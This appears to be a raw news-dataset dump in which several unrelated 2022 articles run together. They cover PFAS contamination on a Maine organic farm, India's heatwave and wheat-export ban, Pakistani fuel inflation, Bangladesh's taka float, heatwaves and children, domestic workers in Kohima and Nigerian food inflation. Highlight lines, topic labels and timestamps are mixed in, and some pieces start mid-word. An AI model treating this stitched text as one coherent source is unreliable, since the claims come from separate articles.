The unheated, 3,000-square-foot greenhouse was less frigid, but still cold. Adam sang the praises of spinach as Johanna pulled back fabric to reveal rows of baby plants growing in Unity, Maine – in the middle of a winter.

""Spinach is amazing,” Adam said. “Spinach can just hang out in the bone-cold frozen soil at 15 degrees below (zero) and once it warms up, it is able to move water around and perk right up. And it'll go all winter. It gets incredibly sweet.""

Adam and Johanna had planned to sell spinach and other leafy greens this winter from Songbird Farm. But now those plans are on hold along with everything else on the 20-acre organic vegetable and grain farm where they live along with their 3-year-old son.

The couple hired a private laboratory last fall to test their water, soil and some crops after learning that the land had been repeatedly fertilized – decades before they purchased it – with municipal sludge that was potentially laced with forever chemicals known as PFAS.

The results arrived just before Christmas.

“Complete Crisis,” Johanna said while seated back inside the family’s modest farmhouse. “Just devastated. Heartbroken. Really angry.""

“Terrified,” added Adam.

The water they drink and give to their toddler son contains 400 times more PFAS than the state says is safe. Their soils are also contaminated.

The latest but not the last

Songbird Farm is the latest victim of a growing PFAS problem – and some would say a crisis – that has Maine’s large farming community on edge.

The culprit is a class of industrial chemicals, per- and polyfluoroalkyl substances, that have been widely used for decades in firefighting foam and to make many of the conveniences of modern life: nonstick frying pans, stain-repellent carpets, waterproof jackets, and fast food wrappers that don't get soggy with grease.

But PFAS have been linked to a long list of health problems, including cancer, kidney malfunction and low birth weight.

Now the chemicals are popping up in farm fields and drinking water wells across Maine. The Department of Environmental Protection plans to test more than 700 sites where farmers spread sludge that the agency says had a higher risk of PFAS contamination.

Farmers obtained the fertilizer through a program the DEP licensed and promoted but that has left a toxic legacy.

""I wanted to say that the hearts of everyone at DEP go out to the people who have been impacted by PFAS contamination,” DEP Commissioner Melanie Loyzim told lawmakers last month during a legislative briefing on PFAS. “It's like a nightmare you can't wake up from. People's homes and livelihoods have been destroyed. And the scale of the tragedy keeps growing with every sample that we take.""

Concerns among farmers, consumers

PFAS is a national problem, oftentimes near military bases and industrial sites. But Maine may be more vulnerable because the chemicals were used by paper mills, tanneries and other manufacturers. They are known as ""forever chemicals"" because they do not break down naturally and aren't removed by conventional wastewater treatment. As a result, the these forever chemicals are showing up in the soils and groundwater of farmers that accepted that free fertilizer as well as neighboring properties.

So far, PFAS contamination has shut down two dairy farms in Maine and prompted Songbird Farm to ask retailers to pull vegetables and grains from store shelves. The agriculture community is bracing for more cases, however, as the state embarks on one of the nation’s most aggressive testing campaigns.

Kevin Miller / Maine Public The sign outside Songbird Farm, an organic farm in Unity that is the latest agricultural operation in Maine to be impacted by contamination with “forever chemicals” known as PFAS, potentially linked to sludge used as fertilizer decades ago.

The state has agreed to install hundreds of water filtration systems. The Maine Department of Agriculture, Conservation and Forestry also plans to cover farmers' financial losses for up to one year.

But Nancy McBrady, the PFAS point person at the agriculture department, said the $30 million currently earmarked for PFAS won’t compensate for lost livelihoods and ruined property values. McBrady said the state is looking to federal officials and Congress for help bearing what is expected enormous costs nationally dealing with PFAS pollution.

“I do think that there’s a real conversation that needs to be had at the state level, at the legislative level, about what else is needed,” McBrady said. “The really robust support that has been provided to date both to DEP and the Department of Ag is not enough and it doesn’t make these homeowners or farmers whole.”

Maine has one of the country's youngest and fastest-growing farming communities. So the Maine Organic Farmers and Gardeners Association has been fielding calls from nervous farmers and trying to help them decipher decades-old DEP documents showing where sludge may, or may not, have been spread.

""And that uncertainty, that unknowing is causing a lot of stress in the community right now,” said Sarah Alexander, MOFGA’s executive director. “And it's causing a lot of stress with consumers as well. We want to know that our food is safe. And I believe that our local food system is safe.""

Alexander said Maine is by no means unique when it comes to PFAS issues. But she believes Maine could set a model for other states through its response. And she said state as well as federal officials will need to step up with additional resources for impacted farmers and homeowners.

‘It's so too late…’

Back inside their rustic farmhouse near a toasty wood stove, Adam Nordell said those decisions carry enormous short-term and long-term consequences.

""It was an expensive mistake to spread sludge,"" Adam said.

The couple bought the farm in Unity in 2014 after running small-scale organic operations on leased lands in western Maine. Only about 5 acres are tillable, so the couple leases another 15 acres directly across the road.

Johanna gave birth to their son three years ago, and the couple have spent tens of thousands of dollars on improvements, such as a vegetable washing and packing house, solar panels and a third greenhouse. Their latest investment was a new irrigation well just last year.

Kevin Miller / Maine Public Adam Nordell and Johanna Davis walk alongside one of three greenhouses the operate at Songbird Farm in Unity. The couple has suspended plans to sell organic spinach and other leafy greens from their greenhouses this winter because of the discover of PFAS contamination on their farm.

They sell wholesale vegetables – such as tomatoes, melons, sweet potatoes and greens – to food co-ops in midcoast and central Maine. The family also mills their own wheat, rye and oats and other grains on site and sells them to 100 customers participating in their ""home bakers"" program.

""Then it turns out that water that we are drinking is highly toxic, that food that we are selling to people has levels of chemicals in it, that from living here that Adam and myself and our child have industrial levels of chemical in our blood,” Johanna said. “It just seems so crazy, so backwards.""

While some urged the couple to hold off until follow-up testing was complete, Johanna and Adam opted to ask all stores to pull any of their products from shelves and posted an emotional message on the Songbird Farm’s website. Transparency and trust, they said, are key to organic farms’ relationship with customers.

""Our presumption is it is not safe until someone is able to demonstrate to us that it is safe,” Adam said.

The couple vacillates between fear, anger and frustration.

They are awaiting test results on 1,000 pounds of sweet potatoes in storage as well as follow-up tests from soil and water samples. And they are extremely concerned about their 3-year-old son given research on PFAS in developing bodies.

“At least we know and we can stop drinking our water. But who still doesn't know?” Johanna said. “Who is drinking water right now that's as high as ours? Who is about to have a baby? Who is thinking about having a baby? It's so too late, it's so too late to be telling everybody this. And it can't be soon enough.""

Adam said the state must assure farmers and homeowners that it will provide long-term financial support.

“To leave people in limbo is untenable,” Adam said. “It's not going to be good for the farming community and it is not going to be good for the state to do that. And I know that everyone is scrambling to catch up on this issue. We're just learning about PFAS contamination in Maine. We're just acknowledging it. It's 30 years old, but we're just recognizing it.""

For now, Adam and Johanna say they'll wait — and hope for better results.

“My wheat harvest this year was 50% less than expected, my crops have shrivelled from this heat.
It hasn’t rained in Baras since January; the usual showers that traditionally come in April and May, after the wheat harvest and before they plant the rice, simply never arrived.
Previously Russia and Ukraine together accounted for almost a third of world wheat exports.
“It was terrible, being out in the heat like that for 15 days straight, but we farmers have no choice during the harvest,” said Virk.","It was his buffaloes that he was first worried about. As temperatures in the small village of Baras, deep in the Indian state of Punjab, began to soar to unseasonably hot levels in April, farmer Hardeep Singh Uppal noticed that his two buffaloes, essential for his family’s livelihood, became feverish and unwell.

A few weeks later and the buffaloes now seem fine, flicking their tails leisurely as an icy breeze blows down from an air conditioning unit, a luxury that once sat in Uppal’s parents house but now has been installed in an otherwise run-down cowshed, running all day at great expense. “The vet told me I need to keep them cool in this heatwave otherwise they will die so this is the only way,” said Uppal.

Yet Uppal’s problems, which arose from the heatwave that has gripped India since March, the hottest month on record, only got worse from there. As he and other farmers across north India began to harvest their wheat crop in mid-April, amid temperatures that were regularly above 40C, they were confronted with damaged, shrivelled grain. Unseasonable winter rain and then a scorching summer heatwave that arrived two months early – both markers of climate change – had stunted crop growth and laid waste to his grain and therefore his livelihood.

“My wheat harvest this year was 50% less than expected, my crops have shrivelled from this heat. It’s never been this hot in March before,” said Uppal, who has 1.5 hectares of land. It hasn’t rained in Baras since January; the usual showers that traditionally come in April and May, after the wheat harvest and before they plant the rice, simply never arrived.

The wheat harvest losses, which occurred across India, have left the farmers in terrible debt, having loaned money from a middleman to pay for seeds and fertiliser, but all finding themselves with at least 50% less grain to sell. Profits from the harvest were not nearly enough to cover the money owed, and now interest on those debts is rising.

“All the farmers are very stressed, we are in bad debt. If this hot weather keeps happening then more and more farmers will be forced to sell off their land,” said Uppal.

These farmers, who are on the frontline of the climate emergency, say they have little option to adapt their way of life even as the heat worsens. They still burn their wheat stubble, which contributes to India’s terrible air pollution, as they can’t afford any other method to clear the field. They still plant rice paddy – a heavily water-dependent crop – despite warnings that the water table of Punjab is plunging rapidly, as it is the only crop they can be assured of selling at a good price.

Surjeet Singh, 65, said he had never seen temperatures like this in all his decades of farming, and had lost half of his wheat crop on his 16 hectares of land. “I have lost 700,000 rupees (£7,200) and if this happens again next season I don’t know what I will do,” he said. “It’s heating up everywhere so I am worried about the crops and about the groundwater, which is running out. Soon this land will become as barren as the deserts of Rajasthan.”

But it was not just in rural Punjab that the effects of the India’s unprecedented heatwave were felt. Last weekend, as temperatures in some parts of India’s capital Delhi hit a record-breaking 49C, the Indian government announced it was putting a ban on all wheat exports, due to the heatwave decimating India’s expected harvest. The government said it was a decision made to “manage the overall food security of the country”.

The decision sent ripples across the globe and came as a blow to the international community, who had been relying on Indian wheat exports to help fill a huge supply gap left in the wake of the war in Ukraine. Previously Russia and Ukraine together accounted for almost a third of world wheat exports.

India is the second largest wheat producer in the world, and for the 2022-23 crop season it was expected to be one of the top 10 wheat exporters, predicted to sell 10m tonnes abroad. In April, minister Piyush Goyal had made assurances that “our farmers have ensured that not just India but the whole world is taken care of” and the day before the ban was announced, the government had announced it would be sending envoys to nine different countries “for exploring possibilities of boosting wheat exports”.

But the low wheat yield had meant that the government’s own supplies have dipped to a 13-year low, and the shortage – exacerbated by alleged hoarding of wheat by private traders – led to prices in wheat and flour soaring by 40% in recent weeks. Worried they could be facing food shortages, the government made a major U-turn.

The day after the Indian export ban was announced, global wheat prices jumped a record 6%. German agricultural minister Cem Özdemir warned that “if everyone starts to impose export restrictions or to close markets, that would worsen the crisis”. The United States said it hoped “India would reconsider” its decision to ban wheat exports which “will make the current global food shortage even worse”. At the forthcoming G7 summit in June, countries are expected to pressure India to reverse the ban.

But it has nonetheless brought home the instability of global food supplies in the face of a rapidly warming planet. A study released this week found that extreme events like the one facing north India currently are now 100 times more likely and could take place every three years, rather than every three centuries.

“In a warming world, I would expect a place like India to experience these types of events as the norm rather than as an extreme,” said Luke Parsons, a climate researcher in the Nicholas School of the Environment at Duke University.

As the farmers of Baras testified, the issue was not just heat frying the crops, but making agricultural labour harder and harder, as the times of day it was possible to work outdoors is shrinking fast. “In a place like India, for every degree of global warming, you get about a degree and a half in increases in human heat exposure,” said Parsons.

“As we warm the globe, not only do the midday temperatures rise, but also the heat exposure in the early morning hours and evenings, times when outdoor workers traditionally do more labour intensive tasks. Therefore we will see more people exposed to extreme and unsafe labour conditions.

Jaspal Singh Virk, 48, who has 14 hectares, was among those who suffered health problems from being out in the baking sun while harvesting his wheat. “It was terrible, being out in the heat like that for 15 days straight, but we farmers have no choice during the harvest,” said Virk.

He is relying on rain to fall so his rice crop will survive for the next season, otherwise he faces destitution. “It’s all in God’s hands now,” he said.

uel and food prices were already at a high in 2021 after a faster than expected recovery from Covid-19. The already high prices further shot up in the last few months due to the war in Ukraine. Global natural gas prices have almost doubled in the past five months and global oil prices have risen by about fifty percent.

Many NATO allies are resisting a complete ban on Russian energy exports. However, if Russia is put under a complete energy embargo, the oil price per barrel could reach $150, rapidly boosting global inflation by another 2 percent (the impact would be much higher in countries like Pakistan).

If history is a guide, we should remember that fuel inflation in the past (in the 1970s, after the Arab-Israel war led to an oil embargo) has been associated with deep recessions, hurting the lower- and middle-income earners very hard. The World Bank’s recently released “global economic outlook” has also warned of a recession due to recent fuel inflation, which may persist for a few years.

While consumers worldwide are feeling the heat of costly fuel, the situation is harrowing for developing countries where the purchasing power of millions had already eroded due to the livelihood disruptions during the Covid-19 pandemic.

Governments around the world are trying to cope with fuel inflation in various ways. Some are passing on the prices to consumers, others are exploring the option of targetted subsidies, and still others are taking measures to minimise their energy imports through rationed and rational use.

Global fuel inflation will seriously affect Pakistan’s economy due to its dependence on imported fuels. The current government initially showed a populist reluctance to pass on the global energy prices to domestic consumers. However, facing the challenge of a rising current account deficit (dollar deficit) and weakening currency that required urgent support from the IMF, it eventually raised the prices of petrol, diesel oil and electricity. At the same time, an increase in gas prices is on the cards.

In turn, increased fuel prices have tidal effects on the price of electricity generation, cost of plying public and private transport, cost of agricultural production and processing, cost of manufacturing and consumer price index. Resultantly, Pakistan’s headline inflation quickened to 13.8 percent in May 2022, the highest level in more than two years. The food prices in Pakistan have surged 17.3 percent and transport costs surged 31.8 percent in May 2022 compared to a year earlier. The State Bank of Pakistan (SBP) has already raised policy rates by 675 basis points to check rising prices. The increase in policy rate will slow down the economy (beneficial for macro-economic stability, but bad news for the micro-economy at the household level). However, it cannot reduce the nearly inelastic demand for energy. Thus, fuel inflation will drive the cost of doing business and the cost of living in Pakistan.

While consumers worldwide are feeling the heat of costly fuel, the situation is harrowing for developing countries where the purchasing power of millions had already eroded due to the livelihood disruptions during the Covid-19 pandemic .

There is no shortcut to shield the consumers from higher energy prices. Over short time horizons, households and businesses cannot easily cut energy use in response to rising costs, leaving less to spend on other goods and services. The longer prices stay high, the more their effects evolve, especially for lower- and lower-middle-income earners who would have to compromise their spending on health and food to meet the energy expenses.

Such compromises will have a drastic effect on more than 70 million Pakistanis who are living in multidimensional poverty. According to the pre-Covid-19 statistics (National Nutrition Survey), 55 million people lived below the national (income) poverty line in Pakistan. Almost 72 million experienced mild to severe food insecurity. Drinking water in every second and third household was contaminated with coli form and E-coli bacteria, respectively. Four out of every ten children under the age of five were stunted. A vast majority of the population is not covered under any social protection system.

Covid-19 has turned these numbers obsolete. The situation has likely deteriorated after the pandemic. Even if that were not the case, these numbers are too scary. We are talking of tens of millions of people most vulnerable to current inflation and a possible recession.

There is no denying that the government of Pakistan cannot continue with “across-the-board” fuel subsidies due to the twin deficit (rupee deficit and dollar deficit). However, the most vulnerable and excluded segments of society need to be protected against inflation and a possible recession, and that too, within the framework of the IMF agreement.

The IMF advocates for agile fiscal policies amidst the food and fuel crises. It advises that the government focus on the most urgent spending needs and raise revenue to pay for them. In IMF’s words, “Government responses to the surge in international commodity prices should give priority to protecting the most vulnerable. A critical objective is to avoid a food crisis while keeping social cohesion”. For countries with well-developed social safety nets, it advocates for temporary cash transfers to vulnerable groups while allowing domestic prices to adjust. For other countries, it advises “a more gradual adjustment of domestic prices (of energy) and the use of existing tools to help the most vulnerable during this crisis, while taking steps to strengthen safety nets.”

During these challenging times, the government will be judged by the people of Pakistan as well as by the IMF on what it classifies as the “most urgent spending” (requires prioritisation of spending), and how seriously it focuses on “raising revenue” to pay for them (without adopting too regressive tax collection measures).

""The BB decision will give a respite to banks from the ongoing dollar crunch."" Selim RF Hussain, chairman of the Association of Bankers, Bangladesh.

In an effort to stabilise the forex market, Bangladesh Bank has decided to allow the exchange rates of the taka to float against the US dollar for the first time in a decade.

Economists and bankers have welcomed the move as it will help boost remittance inflow and exports, and also put the brakes on the slide in foreign exchange reserves due to hefty import payments. It, however, could fuel inflation resulting from higher costs of import.

""The latest move will help contain the soaring import payments and subsequently shield the reserves from declining further."" Md Habibur Rahman Chief economist of Bangladesh Bank

The local currency lost its value by 1 percent against the greenback to Tk 89.90 from Tk 89 per dollar soon after the BB decided to follow the floating exchange rates, which means the market forces, not the central bank, will determine the exchange rates.

The country's import payments have shot up since the end of the last year because of the rise in prices of commodities in the global market.

The local currency has recently come under immense pressure amid a US dollar crunch in the domestic market.

""The interbank market was becoming totally dysfunctional over the last few days because of the artificially fixed exchange rate at which no one wanted to trade. The central bank felt it as remitters lost interest in sending money through formal channels at the official buying rate."" Zahid Hussain A former lead economist of World Bank's Dhaka office

Since the second week of last month, the BB took measures to stabilise the forex market but the majority of the banks ignored its instructions on the exchange rates.

On Sunday, it asked banks to set the selling rate of bills for collection at which lenders sell greenback to importers at Tk 89.15 per dollar. But most of the banks fixed the rate at Tk 94-95, resulting in indiscipline in the foreign exchange market.

The central bank also injected a record $6.20 billion into the forex market between July 1 and June 2 this fiscal year.

The dollar crunch has already compelled the BB to depreciate the local currency eight times this year to keep control on the forex market.

But the steps failed to ease the crisis, and the central bank yesterday decided to go for the demand-supply method followed by many developed nations for fixing the exchange rates of the local currency against the US dollar.

WHY SUCH A MOVE?

Bangladesh's forex market has been facing a shortage of the US dollar over the last couple of months mainly due to soaring import payments and lower than expected remittance inflow.

Between July and April this fiscal year, imports went up by 41 percent to $68.66 billion, while exports grew 35 percent to $41.10 billion.

This has resulted in a record trade deficit -- the gap between exports and imports -- of $27.56 billion, up 53 percent year-on-year.

Moreover, remittance inflow fell 15.95 percent year-on-year to $19.19 billion in the first 11 months of this fiscal year.

The foreign exchange reserves decreased to $42.11 billion on June 1 against $46.15 billion on December 31 last year.

Md Habibur Rahman, chief economist of the central bank, said the latest move will help contain the soaring import payments and subsequently shield the reserves from declining further.

FIRST MOVE IN A DECADE

Ahsan H Mansur, executive director of the Policy Research Institute of Bangladesh, said the BB had decided to follow floating exchange rates of taka against the US dollar in 2012.

It had made such a decision to contain the rising import payments stemming from an escalation in private sector credit growth. The move helped both the government and the BB manage macroeconomic stability in an efficient manner, he noted.

Though the BB allowed the exchange rate of the taka to float against the dollar, it had instructed banks, from time to time, to follow certainrates while settling import bills and purchasing dollars from exporters.

It also regularly injected or mopped up greenback from banks to influence the foreign exchange market. This is why the exchange rates were not settled based on supply and demand of the greenback.

BB data shows, the interbank exchange rate of the greenback stood at Tk 84.30 per dollar in February 2012 compared to Tk 76.20 in November 2011. The local currency, however, appreciated in June 2012 and stood at Tk 81 a dollar.

Ahsan said there is no need to panic even if the interbank exchange rate crosses Tk 100 a dollar as the taka may appreciate again after a few months like it did in 2012.

BANKERS WELCOME IT

Selim RF Hussain, chairman of the Association of Bankers, Bangladesh, a platform of managing directors of banks, said it would take seven to eight days to bring stability to the foreign exchange market.

The BB decision will give a respite to banks from the ongoing dollar crunch, he said.

It will allow banks to purchase remittances from exchange houses abroad based on the market rate, meaning that they can efficiently manage their required liquidity.

Syed Mahbubur Rahman, managing director of Mutual Trust Bank, gave the same opinion.

He said banks must follow the new method efficiently and also behave responsibly to help stabilise the forex market.

WHAT ECONOMISTS SAY

Ahsan said both the government and the BB will have to take additional monetary and fiscal measures to restore stability in the financial sector.

He said the BB should lift the lending cap of 9 percent immediately as it will help reduce the pressure of fluctuation in the exchange rate.

For instance, if the interest rate on post-import finance, which is now 9 percent, goes up, traders will feel discouraged to import goods, he said.

Also, remittance inflow will increase automatically due to the rise in exchange rates of the taka against the dollar.

The government should consider withdrawing 2.5 percent incentive given to the remitters, said Mansur, a former official of the International Monetary Fund.

Zahid Hussain, a former lead economist at the World Bank's Dhaka office, said the BB made a very sensible move that recognises the market reality.

The interbank market was becoming totally dysfunctional over the last few days because of the artificially fixed exchange rate at which no one wanted to trade. The central bank felt it as remitters lost interest in sending money through formal channels at the official buying rate, he observed.

""Going forward, it will be important not to lose patience. The market has gone through a short period of instability. The transition back to a stable floating rate will not happen overnight. The market will find the equilibrium rate through trial and error over time ...

""There is no free lunch. By increasing the cost of imports, exchange rate depreciation will exacerbate inflationary pressure. This must be managed through judicious and coordinated use of monetary and fiscal policy,"" he noted.

Zahid further said the next budget can complement monetary policy efforts by containing deficit spending and expanding the provisions for social assistance. The latter is critical for low-income households for whom high inflation is a livelihood crisis.

Former BB governor Salehuddin Ahmed said the prices of imported commodities in the local market usually increase at a faster pace than that in the global market due to a lack of market governance.

The government should protect the consumers from the vested quarters, he said.

Besides, social safety nets for the lower-income groups should be widened in the next budget so they can get a respite from the price hike, added Salehuddin.",Livelihood Crisis,2022-06-03 07:00:00

The only long-term solution to climate change is reducing greenhouse gas emissions.
Another is consulting directly with children themselves – children have important ideas about the world they want and need to thrive.","As heatwaves continue to scorch us this summer, I am reminded of a kindergarten Hindi poem about a young bird sharing the experience to her mother of flying around the world, which ended with these lines – “Mata ko yeh vachan sunaye, Dekh liya humne jag saara, Apna ghar hai sabse pyara”. (Telling you O Mother we give you our word, we have seen the whole world, yet our home is the most blessed place). Isn’t this true for most of us? We love our homes irrespective of their size or the facilities therein. The possessiveness, which we have for our homes, is somehow missing when it comes to our Earth – our collective and only home.

India, the world's second populous nation is one of the most vulnerable countries to be adversely impacted by climate change. According to the Global Climate Risk Index, it was the tenth most climate-affected country in the world in 2022. India is presently in the middle of a heat wave, with record temperatures in parts of northern, western and central India. On May 16, Delhi recorded a maximum temperature of 49 degrees Celsius. In other parts of the country, the temperatures varied from 44-47 degrees Celsius. A recent study carried out in Maharashtra and Bihar states by Sphere India, a National Coalition of Humanitarian Agencies in India including World Vision India found that a third of the respondents said these heatwaves risk plunging them into poverty as their livestock has died and crops have failed - the two main sources of their livelihood. Heatwaves have already killed 24,380 people from 1991-to 2018, according to the National Disaster Management Authority (NDMA).

We did have heat waves in the past. However, in recent years, the intensity of the heat waves has increased. According to an ongoing study by the Meteorological Department, the number of heatwave days in India has increased in the last 10 years. According to Dr. Pai from the Kottayam based Institute for Climate Change studies, “The inland regions studies have shown more than eight heatwave days, on average, in the months from April to June and the affected areas have increased from 1991 and 2020, in comparison to the previous three decades starting from 1961.

We know that these heat waves are caused by the phenomenon of high-pressure areas formed in the upper atmosphere, which traps the air and pushes it downward, rather than allowing it to move upwards to cooler zones. Global warming and climate change have been a triggering factors and play a primary role in the increase of the frequency of these atmospheric events as mentioned earlier-- also endorsed by Dr Pai and Mahesh Palawat (Vice President of Skymet Weather Services). As the air gets trapped in these high-pressure areas, the higher concentrations of greenhouse gases further add to the heat in the air mass, thereby raising the temperatures in simple terms.

Climate and environmental hazards are already having devastating impacts on the well-being of children. According to a study conducted by Columbia University and published in ‘PLoS One Medicine’ in 2018, infants and children are particularly vulnerable to dehydration and heat stress in a heatwave context. Children are more likely to be affected by respiratory diseases, kidney diseases, electrolyte imbalance and fever, during heat waves. Due to heatwaves, a large section of people’s lives and livelihoods get impacted. As a result, the climate crisis is creating a child rights crisis and threatening their very survival. It is creating a water crisis, a health crisis, an education crisis, a protection crisis and a participation crisis.

Unfortunately, this is only the beginning. The present situation is similar to that of one’s house is on fire, and there is a need for urgent action to douse the fire. While there have been efforts from the Government, National Disaster Management Authority (NDMA) and other stakeholders towards addressing these issues, there still seem to be a lack of collective action involving everyone coming together for a movement to save and protect our only home, the Earth. Not only do climate and environmental hazards negatively affect children’s access to key essential services. Children’s lack of access to key essential services also reduces their resiliency and adaptive capacity, further increasing their vulnerability to climate and environmental hazards. Thus, a vicious cycle is created, pushing the most vulnerable children deeper into poverty while at the same time increasing their risk of experiencing the worst and most life-threatening effects of climate change.

Heat waves and extreme weather conditions are often associated with issues of water scarcity. More and more water is drawn out of the ground to meet various needs arising out of the heat wave conditions, with very less recharging of the groundwater systems. It is, therefore, important to take up the practice of rainwater harvesting both in rural and urban areas. The regeneration of degraded lands with green spaces needs to take the form of a movement through appropriate regeneration methods like reforestation, afforestation, assisted natural regeneration, Farmer Managed Natural Regeneration (FMNR) etc. Appreciate the Government of India’s commitment to restore 26 million hectares of degraded land by 2030.

It is important to also focus on developing carbon sinks in urban towns and cities in the form of urban forests through the active participation of the local communities and other stakeholders. These could be opportunities to replicate models like Miyawaki, which has been successful in different parts of the world-- developing common lands into green spaces with trees, etc. Government can come up with schemes to motivate the urban dwellers to come out, plant trees, and nurture them. We need to take conscious steps in moving towards ‘Green Infrastructures’, which will use locally available resources to naturally regulate the indoor room temperature, harvest rainwater for usage and rely on natural light to reduce carbon footprint.

Preparedness and early warning systems are part and parcel of a larger necessary agenda for climate risk management and must be paired with efforts and investments in risk prevention. Mainstreaming environmental education into the school curriculum is essential to ensure children make informed choices about climate action and sustainability. Skill-based learning is also essential to empower children, adolescents and teachers to participate in climate mitigation, adaptation and climate-resilience activities in schools, to encourage children to become part of the solution to climate change. Investing in sustainability education has a tremendous multiplier effect. For example, investing in school infrastructures to create disaster-resilient classrooms will help reduce long-term disruption to children’s learning process during any climate-induced crisis such as heat waves or floods.

The challenge ahead is daunting, however, the Covid lockdowns have shown that nature is resilient and has the power to bounce back quickly if given the support it needs. The only long-term solution to climate change is reducing greenhouse gas emissions. There are many other promising solutions to draw from – including nature-based solutions. One of the most sustainable solutions is the transition towards an economic model, which decouples economic growth from fossil fuel consumption and thus reduces emissions to safe levels. Another is consulting directly with children themselves – children have important ideas about the world they want and need to thrive. Only with such truly transformative action will we bequeath children a liveable planet.

Our Correspondent

Kohima, June 13 (EMN): Assistant Director of Centre for Development Initiatives (CDI), Guwahati, Sr. Molly Mathew on Monday said that domestic work is not regulated in many contexts as it is invisible and happening within the private space of the homes, which is not defined as a “workplace”.

She said that the lack of regulation of domestic work devalues the economic and social contribution of such work to development. This promotes situations of abuse and exploitation of workers which includes contract substitution, poor wages, non-payment or delayed payment of wages, very long hours of work, no break periods or rest days, restrictions on freedom of movement and association among others.

Matthew was speaking during a state-level workshop on decent work and dignified life for domestic workers beyond COVID-19 organised by Ferrando Domestic Workers’ Alliance (FDWA), Kohima in collaboration with Centre for Development Initiatives (CDI), Guwahati, at St. Francis de Sales (SFS) parish hall in Kohima.

CDI has been working with domestic workers since 2004 and they have helped about 23000 domestic workers across Northeast India, covering 12 cities within six states, Mathew informed, adding that it is with the support of many stakeholders and the Labour department of various states that they have been able to realise the dignity of domestic work and the workers to some extent.

In Kohima alone, she informed how they are currently working with 719 domestic workers. She apprised that out of 719 domestic workers in the district, they obtained about 649 Aadhaar cards, 38 health cards and 190 ration cards while they opened 520 bank accounts for the domestic workers.

According to her, the salary of 714 domestic workers are being paid in cash and not through banks while the figure of those who have no other source of livelihood stands at 694.

Stating that the domestic workers were the most hit by the COVID-19 pandemic, she informed that out of the 12 cities including Kohima, CDI supported 64 thousand households with dry ration, medical support and counseling.

Mathew said that they had conducted an assessment study on the working and living conditions of domestic workers during the COVID-19 outbreak and were able to collect 8070 data of domestic workers online to know the velocity of the impact of COVID-19 outbreak on them.

Speaking on the occasion, Chothalu Phesao, senior supervisor, 181 – Women Helpline, Nagaland, said that domestic workers in the state are often looked down upon and treated merely as servants. As a result, Nagas don’t get domestic work due to demand for high wages whereas migrants are easily accepted by employers “because they are willing to work for a cheaper rate.”

Some serious issues that the domestic workers have to confront on almost daily basis, she said are violation of rights, low rate of payments, no leave, no fixed minimum wage, verbal, sexual and all types of abuse at workplace, delay in payment, sudden dismissal of work without prior information to the worker, etc.

“According to the International Labour Organisation (ILO), domestic work refers to work carried out within the domestic space such as sweeping, cleaning utensils, washing clothes, cooking, caring for children, and the like, by an individual for an employer in return for remuneration,” she said.

Phesao narrated how a domestic worker working as a cook was robbed off her income during the onset of the lockdown while she continued to struggle even after regulations were eased later.

It was learnt that despite returning to work, a gaze of suspicion replaced the erstwhile warmth as the worker was now seen as a potential carrier of the virus by her employers. The worker is sprayed with disinfectant all over before being allowed to enter the house, she added.

“She doesn’t like it, and her skin itches all the time but if she wants to feed her family, this is her only alternative,” Phesao said.

Meanwhile, she maintained that the demands of domestic workers are simple as they just want their basic rights from the state government such as recognition of domestic labourers as workers, protection against all types of harassment, social security and access to benefits, etc.

Women less represented in decision making, politics

Nginyei Konyak, member of Nagaland State Commission for Women, speaking on the economic status of women in Nagaland, said there were many women as bread earners of their family.

While one cannot deny the gender disparity that exists in Naga society, she said that women are less represented in domains like decision making and politics. However, with regard to other index of modern society such as education, life skills, creativity and intellectual pursuits, she was appreciative of Naga women “who are second to none.”

She also maintained that many domestic workers or helpers are women who support their family. “Every kind of work, be it domestic work, is dignified and decent,” she said.

With Nagaland being an agricultural state, she applauded women for playing a vital role as “the seed keepers”.

T Chubayanger, project officer from the Labour department, stated that domestic workers “have a lot of power in their hands”.

He also highlighted the need to register the domestic workers from Kohima in the department and to impart soft skills for livelihood activities.

Representing the domestic workers, Golapi Thapa, shared about the ordeal they faced during the unprecedented pandemic, and acknowledged FDWA Kohima and all concerned for their help during the time of crisis.

Ainato Yetho, deputy director of Nagaland AIDS Control Society, Kohima highlighted the basics of HIV/AIDs and free treatment being made available to infected persons.

Outgoing coordinator of FDWA Kohima city, Sr. Theresa Langhu, informed how they have been working to improve the living and working conditions of the domestic workers, for the past seven years.

She requested to continue extending support and valuable help towards strengthening the organisation for the welfare of the marginalised section in the society.

She also welcomed Sr. Agnes Khala, who would be replacing her as the new coordinator of FDWA Kohima.

During the event, discussion and drafting of action plans were also held for the well-being of the domestic workers.",Livelihood Crisis,2022-06-13 15:26:10

In its Consumer Price index (CPI), the bureau said the rise in the food index was due to increases in prices of bread and cereals, food product, potatoes, yam and other tubers, fish, meat, oils, and fats.
The stakeholders' report laid emphasis on acute food and nutrition insecurity in the Sahel and West African region.
Not forgetting that in the 2021 Global Hunger Index, Nigeria ranks 103rd out of the 116 countries with sufficient data to calculate 2021 GHI scores.
AirSmat offers holistic services and solutions for intelligent and precision agriculture using artificial intelligence.","The recent statistics by the National Bureau of Statistics (NBS) revealed, said the inflation rate rose to 15.92 percent in March 2022, representing a 0.22 percent point rise when compared to 15.7 per cent recorded in February 2022. The Bureau also said that the composite food index rose year-on-year (YoY) by 0.09 percent points to 17.20 percent in March 2022 from 17.11 per cent in February 2022.

In its Consumer Price index (CPI), the bureau said the rise in the food index was due to increases in prices of bread and cereals, food product, potatoes, yam and other tubers, fish, meat, oils, and fats.

The above statistics are manifest with a panoramic view of the present state of livelihood in Nigeria, which gives a glimpse into the level of poverty ravaging the nation with respect to food security. Staple foods such as garri, corn, rice, yam, beans, millet, potatoes, and others have all jerked up with prices above the common man's pocket. With the rising food inflation, it is not uncommon that some households could have been forced to the ratio of 0.0.1 or 0.1.0 for their daily meals. This is chiefly associated with shrinking income or stagnated income that is no longer sufficient to meet the rising cost of food products.

Also in recent times, a report processed by the United Nations Food and Agriculture Organisation (FAO) in collaboration with the Federal Ministry of Agriculture and Rural Development (FMARD) disclosed that about 18 million people will face food insecurity across Nigeria between June and August 2022. The stakeholders' report laid emphasis on acute food and nutrition insecurity in the Sahel and West African region.

The report said the food crisis will affect Nigerians in 21 states and FCT including, 416,000 Internally Displaced Persons (IDPs). It noted that about 14.4 million people including 385,000 IDPs in 21 States and FCT of Nigeria are already in the food crisis till May 2022.

